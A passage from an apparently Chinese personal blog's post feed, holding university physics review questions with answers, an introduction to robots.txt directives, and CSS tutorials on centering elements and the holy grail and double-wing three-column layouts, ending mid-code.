id="判断题-4">判断题</h3><ol><li><p>（思考5.1.1）两个完全相同的均匀带电小球分别带电荷量$q_1=2C$(正电荷)，$q_2=4C$(负电荷)，在真空中相距为r且静止，相互作用的静电力为F。当$q_1,q_2,r$都加倍时，作用力不变（✔）</p></li><li><p>在真空中相距为$r$且静止，相互作用的静电力为$F$，若两个小球的带电量都增加一倍，则它们之间的力也增加一倍（✖）</p></li><li><p>（思考5.7）静电场中的零电势可以随意选择（✔）</p></li><li><p>如果通过一个闭合曲面的电场强度通量为0，那么该曲面上的电场强度处处为零（✖）</p></li><li><p>（思考5.6）在电场中，电场强度为零的点，电势也为零（✖）</p></li><li><p>（思考5.6）在静电场中，电势为零的点电场强度也一定为零（✖）</p></li><li><p>（思考6.7）在匀强磁场中，面积相同、通有相同电流的的线圈，它们的磁矩也相等（✔）</p></li><li><p>（思考7.1）感应电动势的大小取决于磁场强度（✖）</p></li><li><p>感应电荷量与穿过闭合线圈的磁铁速度无关（✖）</p></li><li><p>感应电荷量大小与穿越闭合线圈的磁铁的极性无关（✔）</p></li><li><p>磁场中的洛伦兹力不做功（✔）</p></li><li><p>如图所示，当长直导线中的电流发生变化时，线圈中的感应电动势是感生电动势。 （✔）</p><p><img src="https://oss.iuoyt.com/img/posts/cfe4ee4bd5da5097d764d8e5c9ea8b64-1717645771981-90.png" alt="img"></p></li></ol><h2 id="简谐振动">简谐振动</h2><h3 id="简答题-2">简答题</h3><ol><li><p>（思考8.4）振幅为$A$的弹簧振子，当位移是振幅的一半时，它的势能占总能量的？</p><blockquote><p>势能占总能量的$\frac{1}{4}$</p></blockquote></li><li><p>（思考8.4）振幅为$A$的弹簧振子，当它的动能和势能相等时，振子的位移是？</p><blockquote><p>位移$x=\frac{\sqrt{2}}{2}A$</p></blockquote></li><li><p>（习题8.1）一质点按如下规律沿x轴做简谐振动（$x=0.05\cos[4\pi(t+\frac{1}{6})]$），则速度的最大值约为？</p><blockquote><p>$v_{max}=A\omega=0.05\times4\pi m/s\approx0.628m/s$</p></blockquote></li></ol><h3 id="选择题-5">选择题</h3><ol><li><p>轻质弹簧下挂一个小盘，小盘作简谐振动，平衡位置为原点，位移向下为正，并采用余弦表示。小盘处于最低位置时刻有一个小物体不变盘速地粘在盘上，设新的平衡位置相对原平衡位置向下移动的距离小于原振幅，且以小物体与盘相碰为计时零点，那么以新的平衡位置为原点时，新的位移表示式的初相在（<strong>D</strong>）</p><p>A. $0\sim \frac{p}{2}$之间</p><p>B. $\frac{p}{2}\sim p$之间</p><p>C. $p\sim \frac{3p}{2}$之间</p><p>D. $\frac{3p}{2}\sim 2p$之间</p></li><li><p>一质点沿<em>x</em>轴作简谐振动，振动方程为$x=4\times10^{-2}\cos(2\pi t+\frac{\pi}{3})$。从$t = 0$时刻起，到质点位置在$x=-2 cm$处，且向x轴正方向运动的最短时间间隔为（<strong>A</strong>）</p><p>A. $\frac{1}{2}s$</p><p>B. $\frac{1}{4}s$</p><p>C. $\frac{1}{6}s$</p><p>D. $\frac{1}{8}s$</p></li><li><p>图中所画的是两个简谐振动的振动曲线。若这两个简谐振动可叠加，则合成的余弦振动的初相为（<strong>B</strong>）</p><p><img src="https://oss.iuoyt.com/img/posts/f8518150a0292bcf7e59f200ea72aabb-1717664091015-13.png" alt="img"></p><p>A. $\frac{3}{2}\pi$</p><p>B. $\pi$</p><p>C. $\frac{1}{2}\pi$</p><p>D. 0</p></li><li><p>在下面几种说法中，正确的说法是（<strong>C</strong>）</p><p>A. 波源不动时，波源的振动周期与波动的周期在数值上是不同的.</p><p>B. 波源振动的速度与波速相同.</p><p>C. 在波传播方向上的任一质点振动相位总是比波源的相位滞后(按差值不大于p计).</p><p>D. 在波传播方向上的任一质点的振动相位总是比波源的相位超前.(按差值不大于p计)</p></li><li><p>图示一沿x轴正向传播的平面简谐波在$t=0$时刻的波形.若振动以余弦函数表示，且此题各点振动初相取$-p$到$p$之间的值，则（<strong>B</strong>）</p><p><img src="https://oss.iuoyt.com/img/posts/c6cb7b3f802005f0ee75b8aab8b0741d-1717664107815-22.png" alt="img"></p><p>A. <em>O</em>点的初相为$\phi_0=-\frac{1}{2}\pi$</p><p>B. <em>1</em>点的初相为$\phi_1=0$</p><p>C. <em>2</em>点的初相为$\phi_2=0$</p><p>D. <em>3</em>点的初相为$\phi_3=0$</p></li></ol><h3 id="填空题-5">填空题</h3><ol><li>（思考8.2）将弹簧振子的弹簧截去一部分，其振动周期将【减小】</li><li>（思考8.4）振幅为$A$的弹簧振子，当位移是振幅的一半时，它的动能占总能量的：$\frac{3}{4}$</li><li>（习题8.1）一质点按如下规律沿x轴做简谐振动（$x=0.05\cos[4\pi(t+\frac{1}{6})]$），则加速度的最大值约为：$a_{max}=A\omega^2\approx7.89m/s^2$</li><li>（习题8.2）设简谐振动的方程为$x=0.02\cos(100\pi t+\frac{\pi}{3})$，则t=1s时相位为：$\frac{301}{3}\pi$</li><li>（习题8.8.3）质量$m=100g$的小球与弹簧构成的系统，按$x=0.05\cos(4\pi t+\frac{\pi}{3})$的规律做自由振动，则振动的能量是：$E=\frac{1}{2}m\omega^2A^2=2\pi^2\times10^{-3}J$</li><li>（习题1.9）一质量为$m$的质点在$Oxy$平面上运动，其位置矢量为$r=a\cos\omega ti+b\sin\omega tj$，其中$a,b,\omega$都是常量，则质点所受的力对原点$O$的力矩为：$M=r\times F=r\times(-m\omega^2r)=-m\omega^2(r\times r)=0$</li></ol><h3 id="判断题-5">判断题</h3><ol><li>（思考8.1.1）当弹性小球在地面上跳动时，是一种简谐振动。（✖）</li><li>（思考8.1.2）小球在光滑的球形凹槽内进行小幅度摆动时，这是一种简谐振动（✔）</li><li>（思考8.6）阻尼振动也是一种周期性振动（✖）</li><li>（思考8.10.1）同一波线上，相位差为$2\pi$的两个振动质元之间的距离就是在一个周期内振动所传播的距离（✔）</li><li>（思考8.13）机械波可以传递能量，也可以传递动量（✖）</li></ol>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学期总结 </tag>
            
            <tag> 大学物理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>robots.txt介绍</title>
      <link href="/posts/d5315100.html"/>
      <url>/posts/d5315100.html</url>
      
        <content type="html"><![CDATA[<h2 id="robots-txt概述">robots.txt概述</h2><ul><li><p><code>robots.txt</code>是一个存放在网站根目录下的ASCII编码文件，用于告诉搜索引擎爬虫这个站点中有哪些内容是不应该被抓取的，哪些又是可以获取的。在爬取页面之前，爬虫会查看网站的<code>robots.txt</code>文件以确认不应该爬取的页面。<code>robots.txt</code>并非规范，而是约定俗成，有些爬虫机器人会遵守这一规范，有些则并不会。以下是Cloudflare对<code>robots.txt</code>的介绍：</p><blockquote><p>Robots.txt 文件是针对机器人的一组指令。该文件包含在大多数网站的源文件中。Robots.txt 文件主要用于管理 Web 爬网程序类的良性机器人活动。</p></blockquote></li><li><p>每个站点的robots.txt仅适用于所在协议、主机和端口号都相同的页面，Google对其解释如下：</p><blockquote><p>robots.txt 文件仅适用于所在的协议、主机和端口内的路径。也就是说，<code>https://example.com/robots.txt</code> 中的规则仅适用于 <code>https://example.com/</code> 中的文件，而不适用于子网域（如 <code>https://m.example.com/</code>）或备用协议（如 <code>http://example.com/</code>）。</p></blockquote></li></ul><h2 id="robots-txt文件的编写">robots.txt文件的编写</h2><h3 id="文件组成">文件组成</h3><ul><li><p><code>robots.txt</code>文件由一个或多个组组成，每个组都以<code>User-agent</code>开头，内容则由多条规则（指令）组成，每条规则占一行。</p></li><li><p>爬虫会从上到下处理组，一个用户代理（User-agent）仅能匹配一个组，如果同一用户代理有多个组，则会在处理之前讲这些内容合并到一个分组中。</p></li><li><p>规则的内容区分大小写</p><blockquote><ul><li>规则区分大小写。例如，<code>disallow: /file.asp</code> 适用于 <code>https://www.example.com/file.asp</code>，但不适用于 <code>https://www.example.com/FILE.asp</code>。</li></ul></blockquote></li><li><p>以<code>#</code>开头的行即为注释行，处理过程中会忽略这些内容。</p></li></ul><h3 id="User-agent">User-agent</h3><ul><li><p>User-agent（用户代理）既可以是普通用户的浏览器，或是机器人的名称。</p></li><li><p>常见搜索引擎机器人用户代理名称如下：</p><blockquote><p><strong>Google：</strong></p><ul><li>Googlebot</li><li>Googlebot-Image（用于图像）</li><li>Googlebot-News（用于新闻）</li><li>Googlebot-Video（用于视频）</li></ul><p><strong>Bing</strong></p><ul><li>Bingbot</li><li>MSNBot-Media（用于图像和视频）</li></ul><p><strong>Baidu</strong></p><ul><li>Baiduspider</li></ul><p><strong>Yahoo</strong></p><ul><li>Slurp</li></ul></blockquote></li><li><p>使用<code>*</code>作为通配符，可以匹配所有<code>User-agent</code>。</p></li></ul><h3 id="Disallow">Disallow</h3><ul><li><p>配置在<code>Disallow</code>中的内容为不允许机器人爬取的页面，每一行仅可以配置一个目录或页面，多个禁止项可以使用多个<code>Disallow</code>。</p>  <figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Disallow: <span class="regexp">/cgi-bin/</span></span><br><span class="line">Disallow: <span class="regexp">/images/</span></span><br><span class="line">Disallow: <span class="regexp">/tmp/</span></span><br><span class="line">Disallow: <span class="regexp">/private/</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="Allow">Allow</h3><ul><li><p>使用<code>Allow</code>配置允许机器人爬取的页面，相应的，没有规定的页面则不允许爬取，可以结合<code>Disallow</code>使用。</p>  <figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">Disallow:</span> /blog</span><br><span class="line"><span class="symbol">Allow:</span> <span class="keyword">/blog/</span>allowed-post</span><br></pre></td></tr></table></figure><blockquote><p>在这个例子中，搜索引擎可以访问： <code>/blog/allowed-post</code>，但是它不能访问：</p><p><code>/blog/another-post</code></p><p><code>/blog/yet-another-post</code></p><p><code>/blog/download-me.pdf</code></p></blockquote></li><li><p>规则冲突</p><ul><li><p>如果同时在<code>Allow</code>和<code>Disallow</code>中声明了同一个路径，则遵循指令字符较长的那个</p>  <figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">Disallow:</span> <span class="keyword">/blog/</span></span><br><span class="line"><span class="symbol">Allow:</span> /blog</span><br></pre></td></tr></table></figure><p>在这一举例中，<code>Disallow</code>长度为6字符，而<code>Allow</code>则为5字符，那么机器人会遵循<code>Disallow</code></p></li><li><p>如果<code>Disallow</code>和<code>Allow</code>长度相同，那么会使用限制范围较小的指令。</p></li></ul></li></ul><h3 id="Sitemap">Sitemap</h3><ul><li><p>使用<code>Sitemap</code>可以标记网站地图的所在位置，这个xml文件中通常包含需要被搜索引擎抓取、索引的所有页面。</p>  <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sitemap: https:<span class="regexp">//</span>www.domain.com/sitemap.xml</span><br></pre></td></tr></table></figure></li><li><p>如果没有向搜索引擎主动提交网站地图，那么机器人可以<code>Sitemap</code>标识的网站地图快速获知需要被爬取的页面。</p></li><li><p><code>Sitemap</code>一般写在<code>robots.txt</code>文件的开头或结尾，可以使用多条<code>Sitemap</code>标识多个<code>sitemap.xml</code>文件的路径。</p></li></ul><h3 id="Crawl-delay（Google不再支持）">Crawl-delay（Google不再支持）</h3><ul><li><p>使用<code>Crawl-delay</code>可以指定抓取的间隔时间，即每次抓取后停止的时间，单位是秒。</p>  <figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Crawl-<span class="keyword">delay</span>: <span class="number">5</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="Noindex（Google不支持）">Noindex（Google不支持）</h3><ul><li><p>指定搜索引擎不索引的路径</p>  <figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Noindex: <span class="regexp">/blog/</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="Nofollow（Google不支持）">Nofollow（Google不支持）</h3><ul><li><p>指定搜索引擎不跟随某个地址</p>  <figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Nofollow: <span class="regexp">/blog/</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="robots-txt文件的作用">robots.txt文件的作用</h2><p><code>robots.txt</code>文件的使用有如下好处：</p><ul><li>防止抓取重复页面；</li><li>让网站在某个阶段不公开 (比如：在搭建网站雏形时);</li><li>防止抓取内部搜索页面;</li><li>防止服务器过载;</li><li>防止谷歌浪费crawl budget（抓取预算）;</li><li>防止部分图片、视频及其它资源展示在搜索引擎结果中。</li></ul>]]></content>
      
      
      <categories>
          
          <category> SEO </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEO </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSS 实现元素水平垂直居中的方式</title>
      <link href="/posts/4b182ac7.html"/>
      <url>/posts/4b182ac7.html</url>
      
        <content type="html"><![CDATA[<ul><li><p>本文使用解结构如下：</p>  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">section</span> <span class="attr">class</span>=<span class="string">&quot;father&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;son&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="定位-margin-auto（不定宽高可用）">定位+margin:auto（不定宽高可用）</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.father</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.son</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">right</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">bottom</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">margin</span>: auto;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="定位-transform（不定宽高可用）">定位+transform（不定宽高可用）</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.father</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.son</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">translate</span>(-<span class="number">50%</span>, -<span class="number">50%</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="定位-margin负值">定位+margin负值</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.father</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.son</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">margin-top</span>: -<span class="number">50px</span>;</span><br><span class="line">    <span class="attribute">margin-left</span>: -<span class="number">50px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="flex-grid布局（不定宽高可用）">flex/grid布局（不定宽高可用）</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.father</span> &#123;</span><br><span class="line">    <span class="comment">/* 设置为flex或grid */</span></span><br><span class="line">    <span class="attribute">display</span>: flex;</span><br><span class="line">    <span class="attribute">justify-content</span>: center;</span><br><span class="line">    <span class="attribute">align-items</span>: center;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.son</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="table布局">table布局</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.father</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: table-cell;</span><br><span class="line">    <span class="attribute">vertical-align</span>: middle;</span><br><span class="line">    <span class="attribute">text-align</span>: center;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.son</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: inline-block;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>圣杯布局与双飞翼布局</title>
      <link href="/posts/12149869.html"/>
      <url>/posts/12149869.html</url>
      
        <content type="html"><![CDATA[<h2 id="文档结构">文档结构</h2><ul><li><p>本文使用的预设样式如下：</p>  <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">* &#123;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.wrapper</span> &#123;</span><br><span class="line">    <span class="attribute">overflow</span>: hidden;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#333</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.wrapper</span><span class="selector-pseudo">::before</span> &#123;</span><br><span class="line">    <span class="attribute">content</span>: <span class="string">&#x27;wrapper&#x27;</span>;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#888</span>;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">30px</span>;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">translate</span>(-<span class="number">50%</span>, -<span class="number">50%</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.col</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#333</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">220px</span>;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">30px</span>;</span><br><span class="line">    <span class="attribute">text-align</span>: center;</span><br><span class="line">    <span class="attribute">line-height</span>: <span class="number">220px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.main</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: skyblue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.main-wrap</span>&#123;</span><br><span class="line">    <span class="attribute">background-color</span>: pink;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.left</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: yellowgreen;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.right</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: tomato;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>文档四部分分别为：</p><ul><li><code>wrapper</code>：整个文档的容器</li><li><code>main</code>：三栏布局的主要部分，放置在中间</li><li><code>left</code>、<code>right</code>：左栏和右栏</li></ul></li></ul><h2 id="圣杯布局">圣杯布局</h2><h3 id="原理">原理</h3><ul><li>圣杯布局使用浮动+内边距+定位方式实现，父容器设置左右<code>padding</code>为左右两栏宽度，留给左右两栏占据，中间部分自适应宽度。</li><li>优点：主内容区域无需添加一层DOM节点</li><li>缺点：当left部分宽度大于main部分宽度时会出现布局混乱。</li></ul><h3 id="实现">实现</h3><ol><li><p>建立HTML结构如下：</p> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">section</span> <span class="attr">class</span>=<span class="string">&quot;wrapper&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">section</span> <span class="attr">class</span>=<span class="string">&quot;col main&quot;</span>&gt;</span>main<span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">aside</span> <span class="attr">class</span>=<span class="string">&quot;col left&quot;</span>&gt;</span>left<span class="tag">&lt;/<span class="name">aside</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">aside</span> <span class="attr">class</span>=<span class="string">&quot;col right&quot;</span>&gt;</span>right<span class="tag">&lt;/<span class="name">aside</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>效果如下：</p><p><img src="https://oss.iuoyt.com/img/posts/image-20240427152546392.png" alt="预设布局效果"></p></li><li><p>为了防止wrapper设置好padding会超出原大小，为wrapper设置<code>box-sizing: border-box;</code>，然后设置其内部左右边距大小，此时左栏为200px，右栏为300px：</p> <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.wrapper</span> &#123;</span><br><span class="line">    <span class="attribute">box-sizing</span>: border-box;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0</span> <span class="number">300px</span> <span class="number">0</span> <span class="number">200px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20240427153921254.png" alt="image-20240427153921254"></p></li><li><p>然后将三个部分使用左浮动：</p> <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.col</span> &#123;</span><br><span class="line">    <span class="attribute">float</span>: left;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20240427154106538.png" alt="image-20240427154106538"></p></li><li><p>中间主体部分完整宽度由main占据，再分别为左右两栏设置宽度：</p> <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.main</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.left</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.right</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">300px</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20240427154233087.png" alt="image-20240427154233087"></p></li><li><p>现在使用左右两栏的<code>margin-left</code>将其移动到main的同一行</p> <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.left</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">margin-left</span>: -<span class="number">100%</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.right</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">300px</span>;</span><br><span class="line">    <span class="attribute">margin-left</span>: -<span class="number">300px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20240427154405057.png" alt="image-20240427154405057"></p></li><li><p>再使用定位将左右两栏分别移动到对应位置：</p> <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.left</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">margin-left</span>: -<span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">    <span class="attribute">left</span>: -<span class="number">200px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.right</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">300px</span>;</span><br><span class="line">    <span class="attribute">margin-left</span>: -<span class="number">300px</span>;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">    <span class="attribute">right</span>: -<span class="number">300px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20240427154657499.png" alt="image-20240427154657499"></p></li><li><p>圣杯布局的缺点为在放大到一定尺寸（left部分宽度&gt;main部分宽度）时会出现布局混乱</p><p><img src="https://oss.iuoyt.com/img/posts/image-20240427154903240.png" alt="image-20240427154903240"></p></li></ol><h2 id="双飞翼布局">双飞翼布局</h2><ul><li>与圣杯布局类似，双飞翼布局则是使用main部分的margin为左右两栏预留空间。</li><li>优点：解决了圣杯布局放大后会混乱的问题。</li><li>缺点：需要增加一层DOM节点</li></ul><h3 id="原理-2">原理</h3><ol><li><p>建立HTML结构如下：</p> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 